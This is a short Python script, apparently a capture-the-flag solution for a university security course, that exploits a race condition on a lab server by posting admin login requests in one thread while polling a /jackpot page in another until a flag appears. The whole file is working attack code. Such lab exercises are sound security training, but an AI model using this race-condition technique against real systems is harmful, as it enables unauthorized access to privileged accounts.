import requests, re
from threading import Thread, Event

def login_thread(session):
	while not flag_found.is_set():
		session.post(link + "/login", data={"username": "admin", "password": "1234"})

def jackpot_thread(session):
	while not flag_found.is_set():
		response = session.get(link + "/jackpot")
		matches = re.findall("SSof{.*}", response.text)
		if matches:
			print(matches[0])
			flag_found.set()

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23652"

s = requests.Session()
s.get(link)

flag_found = Event()

Thread(target=login_thread, args=(s,)).start()
Thread(target=jackpot_thread, args=(s,)).start()


